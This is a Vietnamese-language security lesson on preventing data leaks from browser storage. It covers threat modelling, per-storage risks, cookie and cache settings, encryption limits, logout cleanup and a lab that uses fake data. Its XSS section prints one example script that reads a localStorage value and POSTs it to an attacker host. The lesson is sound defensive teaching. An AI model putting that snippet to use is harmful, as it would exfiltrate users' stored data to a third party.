# Storage leak: nhận diện và ngăn rò rỉ dữ liệu trong browser storage

Browser storage giúp ứng dụng web lưu trạng thái đăng nhập, bản nháp, dữ liệu offline, cache và tùy chọn giao diện. Tuy nhiên, dữ liệu lưu trong trình duyệt có thể bị đọc, sao chép hoặc gửi ra ngoài nếu ứng dụng lưu quá nhiều thông tin, có XSS, dùng script bên thứ ba không đáng tin hoặc không quản lý vòng đời dữ liệu đúng cách. Một dữ liệu đã ghi vào localStorage, IndexedDB hay Cache Storage không tự trở nên bí mật chỉ vì nó nằm trên thiết bị người dùng.

**Storage leak** là tình huống dữ liệu được lưu trong browser bị lộ tới chủ thể không được phép, qua mã JavaScript cùng origin, request mạng, cache, thiết bị dùng chung, công cụ debug hoặc kênh vận hành. Phòng vệ bắt đầu bằng việc xác định dữ liệu nào thật sự cần lưu, ai có thể truy cập, lưu trong bao lâu và cách thu hồi khi phiên hoặc tài khoản kết thúc.

Bài học thuộc chương **Storage security**, theo đề bài **Storage leak**, trong phạm vi **SECURITY_APPLICATION_SECURITY_BROWSER_SECURITY**: phân tích ranh giới bảo mật giữa trình duyệt, origin, cookie và ứng dụng web để hiểu Same-Origin Policy, CORS và các cơ chế cách ly; thực hành phòng vệ XSS, CSRF, clickjacking bằng CSP, Trusted Types, security headers và kiểm chứng hành vi thực tế.

## 1. Mục tiêu học tập

Sau bài học, người học có thể:

1. Xây dựng threat model cho dữ liệu lưu trong trình duyệt.
2. Nhận diện các đường rò rỉ qua localStorage, sessionStorage, IndexedDB, Cache Storage, cookie và HTTP cache.
3. Giải thích vì sao XSS hoặc một script cùng origin có thể đọc phần lớn dữ liệu browser storage.
4. Phân biệt bảo vệ theo origin với phân quyền người dùng và bí mật dữ liệu.
5. Đánh giá rủi ro khi lưu access token, refresh token, PII, bản nháp và response API trong browser.
6. Hiểu giới hạn của mã hóa dữ liệu phía client và quản lý khóa.
7. Áp dụng data minimization, TTL, cache policy, HttpOnly cookie và server-side revocation.
8. Kiểm tra dữ liệu nhạy cảm bằng DevTools mà không làm lộ chúng thêm qua log hoặc ảnh chụp.
9. Thiết kế và kiểm chứng quy trình logout, hết hạn phiên, đổi tài khoản và xóa dữ liệu.

## 2. Storage leak là gì?

Rò rỉ dữ liệu xảy ra khi dữ liệu đi ra khỏi phạm vi chủ thể được phép sử dụng. Với browser storage, sự cố có thể xảy ra dù trình duyệt đang hoạt động đúng thiết kế: JavaScript cùng origin được phép truy cập nhiều loại storage do origin đó sở hữu.

Ví dụ một ứng dụng lưu access token trong localStorage. Nếu ứng dụng có XSS, mã độc chạy trong trang có thể đọc token rồi gửi tới máy chủ do kẻ tấn công kiểm soát. Trình duyệt vẫn đang thực thi quy tắc Same-Origin Policy bình thường; mã độc đang chạy với quyền của origin hợp lệ.

### Phân biệt các khái niệm

| Khái niệm | Ý nghĩa |
| --- | --- |
| Storage leak | Dữ liệu trong storage bị đọc hoặc truyền tới chủ thể không được phép. |
| Data breach | Sự cố làm lộ dữ liệu; có thể liên quan browser, backend, backup hoặc nhà cung cấp. |
| XSS | Kẻ tấn công khiến script không mong muốn chạy trong origin của ứng dụng. |
| Session theft | Credential/session bị lấy và được dùng để mạo danh phiên người dùng. |
| Data at rest | Dữ liệu đang lưu trên thiết bị hoặc trong storage. |
| Data in transit | Dữ liệu đang truyền qua mạng. |

HTTPS bảo vệ dữ liệu trên đường truyền giữa client và server, nhưng không ngăn script độc hại đọc dữ liệu mà trang được phép truy cập. Mã hóa ổ đĩa có thể bảo vệ thiết bị khi tắt hoặc mất cắp, nhưng không tự bảo vệ dữ liệu trước XSS trong một phiên browser đang mở.

## 3. Threat model cho dữ liệu trong browser

Trước khi chọn API lưu trữ, hãy trả lời bốn câu hỏi:

1. **Tài sản:** dữ liệu nào đang lưu, ví dụ session credential, hồ sơ cá nhân, địa chỉ, đơn hàng, bản nháp hoặc response API?
2. **Chủ thể truy cập:** script cùng origin, iframe, service worker, extension, người dùng thiết bị dùng chung, malware hoặc người có quyền truy cập profile browser?
3. **Đường rò rỉ:** DOM/XSS, request mạng, cache, log, export, backup, đồng bộ, ảnh chụp hoặc thao tác debug?
4. **Tác động:** dữ liệu bị đọc, sửa, replay, dùng để mạo danh, liên kết danh tính hay theo dõi hành vi?

### Ví dụ phân loại tài sản

| Dữ liệu | Mức nhạy cảm thường gặp | Rủi ro khi lộ |
| --- | --- | --- |
| Theme, ngôn ngữ, trạng thái UI | Thấp | Lộ sở thích hoặc cấu hình giao diện. |
| Bản nháp chưa gửi | Tùy nội dung | Lộ nội dung cá nhân, hợp đồng hoặc thông tin công việc. |
| Hồ sơ, địa chỉ, lịch sử giao dịch | Cao | Lộ PII, gây gian lận hoặc xâm phạm riêng tư. |
| Access/refresh token | Rất cao | Mạo danh người dùng cho tới khi credential hết hạn hoặc bị thu hồi. |
| Response API chứa dữ liệu riêng tư | Cao | Lộ dữ liệu dù UI đã đăng xuất nếu cache vẫn tồn tại. |
| Khóa mã hóa hoặc recovery secret | Rất cao | Có thể giải mã dữ liệu được bảo vệ bằng khóa đó. |

Mức độ nhạy cảm phụ thuộc nội dung và ngữ cảnh sản phẩm. Không gắn nhãn “an toàn” chỉ vì dữ liệu không phải password.

## 4. Ranh giới origin không phải ranh giới giữa các module tin cậy

Web Storage và IndexedDB được cô lập theo origin. Origin gồm scheme, host và port. Một trang ở origin khác không thể tùy ý đọc localStorage hoặc IndexedDB của origin hiện tại theo Same-Origin Policy.

Nhưng tất cả script đang chạy trong cùng origin có thể có quyền đọc storage mà origin đó được phép truy cập. Nếu một ứng dụng tải script bên thứ ba, thư viện bị compromise hoặc có XSS, script đó có thể đọc dữ liệu trong localStorage, sessionStorage và IndexedDB của origin.

Ví dụ:

```js
// Mã chạy trong origin của ứng dụng có thể đọc dữ liệu này.
const sessionHint = localStorage.getItem('session-hint');
const draft = sessionStorage.getItem('private-draft');
```

Không có cơ chế mặc định để nói “module thanh toán chỉ được đọc key A, còn module hồ sơ chỉ được đọc key B” trong cùng một origin. Namespace giúp quản lý và tránh xóa nhầm, nhưng không phải security boundary.

### Subdomain và cookie có phạm vi khác nhau

app.example.com và api.example.com là hai origin khác nhau, nên JavaScript của app không thể đọc Web Storage của api theo SOP. Tuy nhiên, cookie được đặt với Domain=example.com có thể được gửi tới nhiều subdomain phù hợp. Cấu hình cookie domain rộng làm tăng phạm vi tác động nếu một subdomain bị compromise.

Không dùng Domain rộng nếu cookie chỉ cần cho một host. Cookie host-only giảm phạm vi gửi cookie tới subdomain.

### Storage partitioning không phải nơi lưu bí mật

Browser có thể partition một số storage trong third-party context theo top-level site. Cơ chế và phạm vi thay đổi theo browser. Không dựa vào partitioning để thay thế kiểm soát quyền, xác thực, mã hóa hoặc data minimization; script được thực thi trong đúng partition vẫn có thể truy cập dữ liệu của partition đó theo API được cấp.

## 5. Các đường rò rỉ theo từng loại storage

### 5.1. localStorage

localStorage tồn tại qua nhiều lần mở trang và có thể được JavaScript cùng origin đọc đồng bộ. Đây là nơi dễ bị khai thác khi có XSS.

Rủi ro:

- Token, PII hoặc bản nháp có thể bị script độc hại đọc và gửi ra ngoài.
- Dữ liệu cũ có thể còn sau logout hoặc khi đổi tài khoản trên cùng browser profile.
- Các tab cùng origin có thể quan sát thay đổi qua storage event.
- Dữ liệu có thể xuất hiện trong DevTools, export hoặc công cụ debug.

Không lưu bearer token dài hạn, refresh token, secret hoặc dữ liệu cá nhân không cần thiết trong localStorage. Nếu lưu tùy chọn giao diện, hãy giới hạn dữ liệu ở mức ít nhạy cảm.

### 5.2. sessionStorage

sessionStorage gắn với origin và top-level browsing context. Nó thường tồn tại trong vòng đời tab, nhưng không phải kho bí mật: script cùng origin vẫn có thể đọc dữ liệu trong context đó.

Rủi ro:

- XSS trong tab có thể đọc nội dung đã lưu.
- Dữ liệu có thể được sao chép khi tab được mở/duplicate theo hành vi browser.
- Tab bị bỏ quên trên máy dùng chung có thể giữ dữ liệu trong phiên.
- Một ứng dụng vẫn có thể ghi PII hoặc token vào sessionStorage dù tên gọi “session” tạo cảm giác ngắn hạn.

sessionStorage phù hợp với trạng thái tạm ít nhạy cảm cần sống trong tab. Nó không bảo vệ credential khỏi XSS.

### 5.3. IndexedDB

IndexedDB thường chứa object graph, dữ liệu offline, queue đồng bộ, file/blob và bản ghi lớn. Vì API được cung cấp cho script cùng origin, XSS có thể đọc hoặc sửa record nếu ứng dụng không có lớp kiểm soát bổ sung.

Rủi ro:

- Dữ liệu hồ sơ hoặc nội dung offline tồn tại sau logout.
- Queue chứa request hoặc payload riêng tư được gửi sau đó.
- Database cũ vẫn còn sau khi người dùng đổi tài khoản.
- Script độc hại có thể sửa dữ liệu để tác động tới luồng nghiệp vụ.

IndexedDB không có ACL theo từng object store hoặc từng module cho các script cùng origin. Cần phân tách dữ liệu theo thiết kế ứng dụng, kiểm tra session ownership và xác thực mọi thao tác quan trọng ở server.

### 5.4. Cache Storage và Service Worker

Cache Storage có thể giữ response API, HTML hoặc tài nguyên offline. Service worker có thể phục vụ cache ngay cả khi người dùng đã đăng xuất nếu logic cache không kiểm tra session và quyền truy cập.

Rủi ro:

- Response chứa PII bị lưu trong cache dùng chung.
- Trang sau logout vẫn nhận response riêng tư từ cache.
- Service worker cũ tiếp tục kiểm soát trang và phục vụ dữ liệu cũ.
- Cache key không phân biệt người dùng hoặc tenant.

Không cache response riêng tư theo chiến lược cache-first chung. Nếu phải cache dữ liệu offline nhạy cảm, cần có thiết kế phân tách user/session, encryption strategy, expiry, cleanup và kiểm tra quyền trước khi hiển thị.

### 5.5. Cookie

Cookie có mô hình truy cập khác Web Storage:

- Cookie không có HttpOnly có thể được JavaScript đọc nếu phù hợp scope.
- Cookie HttpOnly không thể đọc bằng document.cookie, nhưng browser vẫn tự gửi cookie tới server theo quy tắc domain/path/SameSite/Secure.
- XSS có thể không đọc được HttpOnly cookie nhưng vẫn có thể thực hiện request cùng origin bằng cookie tự động đính kèm, nếu ứng dụng không có biện pháp chống XSS/CSRF và kiểm tra quyền phù hợp.
- Cookie domain rộng có thể được gửi tới nhiều subdomain.

Cookie phiên nên cân nhắc Secure, HttpOnly, SameSite và scope host-only hẹp. Các thuộc tính này giảm một số đường rò rỉ, nhưng không thay thế kiểm tra authorization phía server.

### 5.6. HTTP cache

HTTP cache do browser quản lý và khác Cache Storage. Response riêng tư có thể bị lưu theo cache policy nếu server cấu hình không phù hợp.

Với response chứa dữ liệu nhạy cảm, cân nhắc:

```http
Cache-Control: no-store
```

no-store yêu cầu cache tuân thủ không lưu response theo HTTP caching semantics. Nó không ngăn JavaScript tự ghi response vào IndexedDB hoặc Cache Storage. Cache API được ứng dụng gọi tường minh; không giả định header HTTP tự động ngăn cache.put().

Không dùng no-cache như từ đồng nghĩa với no-store: no-cache cho phép lưu nhưng yêu cầu revalidate trước khi dùng theo quy tắc HTTP cache.

## 6. XSS là đường rò rỉ storage quan trọng

XSS xảy ra khi dữ liệu không tin cậy được đưa vào HTML/DOM hoặc execution sink không an toàn, khiến script ngoài ý muốn chạy trong origin của ứng dụng.

Nếu XSS chạy được, script có thể:

- Đọc localStorage/sessionStorage.
- Mở và đọc IndexedDB mà origin có quyền truy cập.
- Đọc cookie không HttpOnly.
- Đọc dữ liệu DOM đang hiển thị.
- Gọi API bằng session cookie hiện tại.
- Đăng ký hoặc tác động tới các luồng ứng dụng mà script có quyền.

Ví dụ minh họa nguy cơ:

```js
// Không dùng trong ứng dụng thực tế.
const value = localStorage.getItem('private-profile');

// Script độc hại có thể gửi dữ liệu ra một endpoint do nó kiểm soát.
fetch('https://attacker.example/collect', {
  method: 'POST',
  mode: 'no-cors',
  body: value
});
```

Ví dụ này chỉ mô tả đường exfiltration. Trong ứng dụng thực tế, cần ngăn XSS, giảm dữ liệu nhạy cảm trong storage và phát hiện hành vi bất thường.

### HttpOnly giảm khả năng đọc cookie, không triệt tiêu XSS

Nếu session cookie là HttpOnly, JavaScript không thể lấy giá trị cookie để gửi sang nơi khác. Tuy nhiên, script XSS vẫn có thể gọi endpoint cùng origin; browser tự đính kèm cookie theo chính sách. Vì vậy, XSS vẫn có thể thực hiện hành động trong phiên người dùng nếu backend không có biện pháp bổ sung.

Phòng vệ XSS vẫn cần:

- Output encoding theo ngữ cảnh.
- Dùng DOM API an toàn như textContent khi hiển thị text.
- Tránh innerHTML, document.write, eval và các execution sink không cần thiết.
- CSP chặt chẽ, nonce/hash phù hợp và tránh unsafe-inline/unsafe-eval khi có thể.
- Trusted Types để kiểm soát các DOM XSS sink trong browser hỗ trợ.
- Kiểm soát dependency, script bên thứ ba và supply chain.

## 7. Các tình huống rò rỉ thường gặp

### Logout chỉ xóa giao diện

Người dùng bấm logout, ứng dụng chuyển về trang đăng nhập nhưng localStorage và IndexedDB vẫn giữ dữ liệu hồ sơ. Người dùng tiếp theo trên cùng profile có thể mở DevTools hoặc trang ứng dụng và đọc lại dữ liệu.

Biện pháp: invalidate session ở server, expire cookie đúng scope, xóa namespace dữ liệu người dùng, dọn cache riêng tư và xác minh service worker không phục vụ lại dữ liệu.

### Đổi tài khoản nhưng dùng chung storage

Một tab đăng xuất tài khoản A rồi đăng nhập tài khoản B. Dữ liệu cache hoặc IndexedDB của A vẫn tồn tại và UI vô tình hiển thị trong phiên B.

Biện pháp: gắn dữ liệu offline/cache với account hoặc tenant identifier đã xác thực; khi đổi danh tính, cleanup dữ liệu cũ trước khi tải dữ liệu mới. Không tin account ID do client tự khai báo làm bằng chứng quyền truy cập.

### Cache API lưu response riêng tư

Service worker cache response /api/profile theo URL nhưng không phân biệt session. Sau khi logout, response cũ vẫn được trả từ cache.

Biện pháp: tránh cache response riêng tư; nếu có use case offline, kiểm tra authorization/session state, tách cache theo account, đặt expiry và xóa khi logout.

### Debug log chứa dữ liệu nhạy cảm

Ứng dụng ghi toàn bộ object profile hoặc token ra console. Log có thể được chụp màn hình, thu thập bởi công cụ hỗ trợ, lưu trong bug report hoặc được extension đọc.

Biện pháp: chỉ log metadata đã giảm nhạy cảm, che/mask định danh, không log token/cookie/tọa độ hoặc payload riêng tư.

### Extension hoặc thiết bị dùng chung

Extension có quyền truy cập trang hoặc profile có thể đọc dữ liệu tùy permission. Người dùng khác có thể truy cập browser profile chưa khóa, dữ liệu tải xuống hoặc file export.

Biện pháp: không coi profile browser là ranh giới bảo mật cho dữ liệu bí mật; cung cấp logout, timeout, session revoke và hướng dẫn bảo vệ thiết bị. Quản trị extension và thiết bị thuộc phạm vi endpoint security.

## 8. Mã hóa dữ liệu trong browser: lợi ích và giới hạn

Mã hóa dữ liệu trước khi ghi storage có thể giảm rủi ro nếu kẻ tấn công chỉ lấy được file/profile offline nhưng không có khóa. Tuy nhiên, hiệu quả phụ thuộc cách tạo, giữ và sử dụng khóa.

### Mã hóa với khóa lưu cạnh ciphertext không tạo ranh giới mới

Nếu ứng dụng lưu cả ciphertext và khóa giải mã trong cùng localStorage, người có thể đọc storage sẽ lấy được cả hai. Cách này chủ yếu làm dữ liệu khó đọc bằng mắt, không bảo vệ trước người có quyền truy cập tương đương.

Ngay cả khi khóa nằm trong IndexedDB, script cùng origin có thể đọc khóa nếu khóa được lưu dưới dạng extractable raw bytes hoặc có thể yêu cầu ứng dụng giải mã.

### Web Crypto và CryptoKey không extractable

Web Crypto API có thể tạo CryptoKey với extractable=false. Điều này ngăn xuất khóa qua các API export key, nhưng không tự ngăn script cùng origin sử dụng khóa cho thao tác được phép nếu script truy cập được CryptoKey và có quyền gọi crypto.subtle.

Ví dụ tạo khóa AES-GCM cho một phiên demo:

```js
const key = await crypto.subtle.generateKey(
  {
    name: 'AES-GCM',
    length: 256
  },
  false,
  ['encrypt', 'decrypt']
);

console.log({
  type: key.type,
  extractable: key.extractable,
  usages: key.usages
});
```

Đây là ví dụ API, không phải thiết kế quản lý khóa hoàn chỉnh. Nếu XSS chạy trong origin và lấy được tham chiếu CryptoKey hoặc có thể gọi code giải mã, dữ liệu vẫn có thể bị lấy ra sau giải mã.

### Khi nào mã hóa phía client có ý nghĩa?

- Khóa được suy ra từ passphrase người dùng không lưu cạnh ciphertext và người dùng phải nhập lại khi cần giải mã.
- Khóa được bảo vệ bởi cơ chế phần cứng hoặc hệ điều hành với quyền truy cập riêng phù hợp.
- Server giữ khóa giải mã hoặc chỉ cấp khóa sau một bước xác thực/ủy quyền bổ sung.
- Ứng dụng có threat model cụ thể về backup/profile offline và hiểu rõ XSS vẫn có thể tác động khi dữ liệu được giải mã.

Không tự thiết kế thuật toán mã hóa. Dùng Web Crypto API với thuật toán chuẩn và thư viện được duy trì; thiết kế nonce/IV, key derivation, rotation và recovery đúng cách.

### Mã hóa không thay thế data minimization

Nếu ứng dụng không cần lưu dữ liệu nhạy cảm, cách an toàn nhất thường là không lưu. Mã hóa làm tăng độ phức tạp, có thể tạo thêm lỗi quản lý khóa và không giải quyết được mọi đường exfiltration khi app đang chạy.

## 9. Thiết kế storage an toàn

### Chỉ lưu dữ liệu cần thiết

Trước khi lưu một trường, hỏi:

- Tính năng nào cần trường này?
- Có thể lấy lại từ server khi cần không?
- Có thể lưu phiên bản rút gọn hoặc đã ẩn danh không?
- Có thể giữ trong memory thay vì storage bền vững không?
- Khi nào dữ liệu hết giá trị?

Không lưu toàn bộ API response chỉ để tránh thêm một request nếu response có PII, credential hoặc dữ liệu tenant khác.

### Chọn storage theo độ nhạy cảm

| Loại dữ liệu | Lựa chọn thường phù hợp | Lưu ý |
| --- | --- | --- |
| Theme, ngôn ngữ, UI preference | localStorage | Không chứa secret; dùng namespace. |
| Trạng thái tạm theo tab | sessionStorage hoặc memory | Vẫn có thể bị đọc bởi XSS. |
| Dữ liệu offline cần đồng bộ | IndexedDB | Phân tách account, mã hóa khi có threat model phù hợp, có expiry và cleanup. |
| Tài nguyên công khai có thể tái tạo | Cache Storage/HTTP cache | Cache key/version rõ; tránh dữ liệu riêng tư. |
| Session credential | Cookie Secure + HttpOnly + SameSite theo kiến trúc | Server quản lý session và revoke. |
| Dữ liệu rất nhạy cảm | Ưu tiên không lưu lâu dài ở client | Nếu bắt buộc, thiết kế khóa và vòng đời riêng. |

Đây là hướng dẫn lựa chọn, không phải quy tắc cứng cho mọi sản phẩm. Cần xem xét browser support, offline requirement và mô hình xác thực.

### Dùng cookie phiên có thuộc tính phù hợp

Ví dụ cookie host-only do server đặt:

```http
Set-Cookie: __Host-session=opaque-value; Path=/; Secure; HttpOnly; SameSite=Lax
```

Prefix __Host- yêu cầu cookie Secure, Path=/ và không có Domain trong browser hỗ trợ prefix này. Nó giúp giới hạn cookie ở host đã đặt. Chọn SameSite theo luồng ứng dụng; Lax không phù hợp mọi trường hợp cross-site và không thay thế CSRF token/origin validation cho mọi endpoint.

Không ghi token vào localStorage rồi cho rằng cookie HttpOnly ở nơi khác đã bảo vệ token đó. Hãy kiểm kê toàn bộ credential và bản sao của chúng.

### Cache private response có chủ đích

Với response chứa dữ liệu cá nhân:

```http
Cache-Control: no-store
```

Tránh đưa response đó vào Cache Storage trừ khi có yêu cầu offline đã được đánh giá. Nếu phải lưu, thiết kế cache namespace theo tài khoản, kiểm tra session hiện hành trước khi đọc và xóa khi logout/đổi tài khoản.

### TTL và cleanup

- Đặt thời hạn lưu theo mục đích dữ liệu.
- Xóa dữ liệu khi logout, đổi tài khoản hoặc kết thúc tính năng.
- Dọn dữ liệu cũ bằng migration có kiểm soát.
- Không dựa vào browser eviction để thực hiện retention policy.
- Không lưu token lâu hơn thời gian cần thiết.

TTL phía client là biện pháp quản lý dữ liệu, không phải authorization. Server vẫn phải từ chối credential đã hết hạn hoặc bị revoke.

## 10. Logout, đổi tài khoản và thu hồi session

Một quy trình logout chỉ xóa UI là chưa đủ. Cần phối hợp backend và browser.

### Quy trình đề xuất

1. Gửi yêu cầu logout tới backend qua endpoint được bảo vệ phù hợp.
2. Backend invalidate session/refresh token và trả cookie hết hạn nếu dùng cookie session.
3. Client xóa các key thuộc namespace của phiên hiện tại.
4. Client xóa IndexedDB record, Cache Storage và dữ liệu offline riêng tư theo account.
5. Service worker không tiếp tục trả response riêng tư đã cache.
6. UI xóa dữ liệu trong memory, reset store/state và điều hướng về trang đăng nhập.
7. Kiểm tra tab khác cùng origin và xử lý thông báo logout/đổi account.

### Ví dụ xóa namespace

```js
function clearSessionLocalStorage(prefix) {
  const keysToRemove = [];

  for (let index = 0; index < localStorage.length; index += 1) {
    const key = localStorage.key(index);
    if (key && key.startsWith(prefix)) {
      keysToRemove.push(key);
    }
  }

  keysToRemove.forEach((key) => {
    localStorage.removeItem(key);
  });
}

clearSessionLocalStorage('app-session:');
```

Prefix chỉ giúp xóa đúng dữ liệu ứng dụng quản lý. Nó không bảo vệ dữ liệu trước script cùng origin và không thu hồi session ở server.

### Đồng bộ logout giữa các tab

Có thể dùng storage event hoặc BroadcastChannel để báo tab khác reset UI:

```js
window.addEventListener('storage', (event) => {
  if (event.key === 'app-session:logout' &&
      event.newValue === '1') {
    resetInMemorySession();
  }
});
```

Tab thực hiện logout có thể ghi marker:

```js
localStorage.setItem('app-session:logout', '1');
localStorage.removeItem('app-session:logout');
```

storage event được phát tới các browsing context khác phù hợp, không phát trong chính document đã thay đổi storage. Đây chỉ là tín hiệu đồng bộ giao diện; server-side session revocation vẫn là nguồn quyết định cuối cùng.

Không đặt credential hoặc dữ liệu riêng tư trong event payload. Một script cùng origin cũng có thể nghe các kênh này.

## 11. Kiểm tra storage leak bằng DevTools

DevTools cho phép kiểm tra dữ liệu lưu ở client. Chỉ audit origin và tài khoản thử nghiệm mà bạn được phép kiểm tra. Không copy token hoặc PII thật vào ticket, chat, ảnh chụp hay log.

### Application panel

Trong Chromium DevTools, mở **Application**:

- **Local Storage:** rà soát key có token, email, địa chỉ, profile hoặc response API không.
- **Session Storage:** tìm bản nháp, credential và dữ liệu tạm còn sau logout.
- **IndexedDB:** kiểm tra database, object store và record có dữ liệu cá nhân.
- **Cache Storage:** kiểm tra response riêng tư hoặc API cache theo URL không phân biệt account.
- **Cookies:** xem Domain, Path, Expires, Secure, HttpOnly và SameSite.
- **Service Workers:** xem registration, scope và worker đang kiểm soát trang.

Khi cần lưu bằng chứng, chụp tên key, loại storage và trạng thái thuộc tính. Che giá trị nhạy cảm; không chụp nguyên token hoặc tọa độ chính xác.

### Network panel

Mở **Network**:

- Kiểm tra response API có dữ liệu nhạy cảm được cache hay không.
- Xem Cache-Control, Set-Cookie và Clear-Site-Data.
- Kiểm tra request sau logout có còn gửi session credential hay không.
- Xem response có được phục vụ từ service worker hoặc cache không.
- Kiểm tra request tới domain bên thứ ba có mang dữ liệu nhạy cảm trong URL/body không.

Không chỉ nhìn tab Preview. Dữ liệu có thể được lưu trong cache hoặc storage sau khi request hoàn tất.

### Sources và Console

Rà soát mã nguồn và runtime:

- Tìm localStorage, sessionStorage, indexedDB, caches.open, cache.put.
- Tìm document.cookie, console.log và các helper logging.
- Tìm innerHTML, insertAdjacentHTML, eval và sink DOM liên quan.
- Xác định script bên thứ ba, tag manager và dependency có quyền chạy trong origin.

Không in toàn bộ storage vào Console trong môi trường production. Chỉ kiểm tra key names hoặc metadata đã mask.

## 12. Thực hành: audit và ngăn storage leak

Thực hành trên ứng dụng lab/local hoặc staging được cho phép. Dùng token giả và PII giả; không thử exfiltrate dữ liệu thật ra endpoint bên ngoài.

### 12.1. Tạo dữ liệu mẫu có chủ đích

Trong Console của origin lab:

```js
localStorage.setItem('lab:theme', 'dark');
localStorage.setItem('lab:access-token', 'FAKE_ACCESS_TOKEN_123');
sessionStorage.setItem('lab:draft', 'Nội dung thử nghiệm');
```

Tạo một IndexedDB database thử nghiệm:

```js
const request = indexedDB.open('storage-leak-lab', 1);

request.onupgradeneeded = () => {
  request.result.createObjectStore('profiles', {
    keyPath: 'id'
  });
};

request.onsuccess = () => {
  const db = request.result;
  const transaction = db.transaction('profiles', 'readwrite');
  transaction.objectStore('profiles').put({
    id: 'demo-user',
    email: 'demo@example.test',
    note: 'Fake profile data'
  });
  transaction.oncomplete = () => db.close();
};
```

Mở Application panel và xác nhận các dữ liệu giả xuất hiện trong đúng storage area.

### 12.2. Xác định dữ liệu nhạy cảm

Lập bảng audit:

| Key/database/cache | Loại dữ liệu | Có cần lưu? | Thời hạn | Ai cần truy cập? |
| --- | --- | --- | --- | --- |
| lab:theme | UI preference | Có thể | Dài hạn | UI cùng origin |
| lab:access-token | Credential giả | Không trong thiết kế mẫu | Không lưu | Không nên có |
| lab:draft | Bản nháp giả | Tùy tính năng | Theo phiên/TTL | Tính năng soạn thảo |
| storage-leak-lab/profiles | Hồ sơ giả | Chỉ để lab | Ngắn hạn | Tính năng profile |

Đề xuất vị trí lưu, TTL và cách xóa cho từng mục. Không để access token giả trong storage sau khi hoàn thành phần quan sát.

### 12.3. Kiểm tra tác động của script cùng origin

Trong lab, chạy đoạn kiểm tra chỉ đọc key giả:

```js
console.log({
  themeExists: localStorage.getItem('lab:theme') !== null,
  tokenExists: localStorage.getItem('lab:access-token') !== null,
  draftExists: sessionStorage.getItem('lab:draft') !== null
});
```

Xác nhận JavaScript cùng origin có thể đọc các key. Đây là hành vi theo thiết kế của Web Storage, không phải lỗi của browser.

Không tạo payload XSS để gửi dữ liệu ra ngoài. Có thể dùng trang lab riêng với một đoạn script do chính bạn viết để minh họa quyền đọc trong cùng origin.

### 12.4. Kiểm tra cookie

Trong lab, cấu hình session cookie giả qua server:

```http
Set-Cookie: __Host-lab-session=fake; Path=/; Secure; HttpOnly; SameSite=Lax
```

Kiểm tra trong Application → Cookies:

- Cookie có Secure và HttpOnly.
- Cookie không có Domain khi dùng prefix __Host-.
- JavaScript không đọc được giá trị qua document.cookie.
- Request phù hợp vẫn gửi cookie tới server theo quy tắc cookie.

Kết quả minh họa rằng HttpOnly hạn chế việc đọc cookie từ JavaScript, nhưng không tự ngăn script XSS thực hiện request cùng origin.

### 12.5. Kiểm tra Cache-Control và Cache Storage

Tạo một endpoint trả dữ liệu giả. Thử response:

```http
Cache-Control: no-store
```

Quan sát HTTP cache. Sau đó thử chủ động gọi cache.put() với response giả và kiểm tra Cache Storage. Xác nhận no-store không thay thế kiểm soát của ứng dụng đối với Cache API.

### 12.6. Kiểm tra logout và đổi tài khoản

Thực hiện logout trong lab:

1. Backend vô hiệu hóa session giả và expire cookie.
2. Client xóa các key theo namespace lab:.
3. Xóa record/database hoặc cache riêng tư theo thiết kế lab.
4. Reset state trong memory.
5. Mở tab thứ hai và xác minh nó cũng chuyển về trạng thái đăng xuất.
6. Reload trang và xác nhận dữ liệu cũ không được service worker/API tạo lại.

### 12.7. Bằng chứng cần lưu

| Bằng chứng | Điều cần xác nhận |
| --- | --- |
| Storage inventory | Xác định được loại storage và dữ liệu giả đang lưu. |
| Same-origin access | Script cùng origin đọc được Web Storage theo thiết kế. |
| Cookie attributes | Cookie giả có Secure/HttpOnly/SameSite và scope đúng. |
| HTTP cache | Response riêng tư dùng policy phù hợp. |
| Cache Storage | Ứng dụng không vô tình cache response riêng tư. |
| Logout | Server revoke session và client dọn dữ liệu đúng namespace. |
| Multi-tab | Tab khác nhận tín hiệu và reset UI; backend vẫn xác minh session. |
| Post-logout reload | Dữ liệu riêng tư không xuất hiện lại từ cache hoặc worker. |

## 13. Những lỗi thường gặp

| Hiện tượng | Nguyên nhân có thể | Cách xử lý |
| --- | --- | --- |
| Token xuất hiện trong localStorage | Chọn storage dễ truy cập bởi JavaScript cho credential | Chuyển sang mô hình session cookie phù hợp hoặc credential ngắn hạn có kiểm soát; revoke token cũ. |
| Dữ liệu vẫn còn sau logout | Chỉ reset UI hoặc xóa một storage area | Lập inventory, cleanup tất cả nơi lưu và revoke session phía server. |
| HttpOnly cookie vẫn bị dùng trong request XSS | Browser tự đính kèm cookie cho request cùng origin | Chống XSS, CSRF và kiểm tra authorization ở backend. |
| Dữ liệu A hiển thị trong tài khoản B | Cache/database không gắn với account lifecycle | Cleanup khi đổi danh tính; kiểm tra ownership phía server. |
| API private xuất hiện trong Cache Storage | Service worker cache response không phân loại | Bỏ cache hoặc thiết kế cache riêng tư có expiry/authorization/cleanup. |
| Nghĩ no-store ngăn Cache API | Nhầm HTTP cache với Cache Storage | Không gọi cache.put() cho dữ liệu riêng tư nếu không có thiết kế được duyệt. |
| Mã hóa nhưng vẫn lộ khi XSS | Khóa hoặc chức năng giải mã có sẵn trong cùng origin | Xác định threat model; không coi mã hóa client là XSS defense. |
| Dữ liệu lộ qua log | Ghi toàn bộ object/token vào console hoặc telemetry | Mask dữ liệu, giảm log và rà soát công cụ quan sát. |
| Dữ liệu lộ qua subdomain | Cookie Domain quá rộng hoặc subdomain bị compromise | Dùng host-only cookie và giới hạn quyền subdomain. |
| Extension đọc được dữ liệu | Profile có extension quyền cao hoặc thiết bị không được bảo vệ | Quản lý extension/endpoint và giảm dữ liệu bí mật lưu tại client. |

## 14. Checklist production

| Hạng mục | Câu hỏi rà soát | Kết quả mong đợi |
| --- | --- | --- |
| Data inventory | Đã biết mọi nơi lưu credential, PII và response riêng tư chưa? | Có danh mục storage, owner, mục đích và TTL. |
| Minimization | Dữ liệu có thật sự cần lưu trên client không? | Chỉ lưu trường tối thiểu, có thể tái tạo thì không lưu lâu. |
| XSS | Có kiểm soát output encoding, DOM sink, CSP và Trusted Types không? | Script không tin cậy khó chạy trong origin. |
| Token | Có bearer/refresh token trong Web Storage không? | Không lưu credential dài hạn trong localStorage/sessionStorage. |
| Cookie | Session cookie có Secure, HttpOnly, SameSite và scope hẹp không? | Cookie host-only khi phù hợp; backend revoke session. |
| IndexedDB | Dữ liệu có phân tách theo account và cleanup khi đổi danh tính không? | Không hiển thị record của user cũ trong phiên mới. |
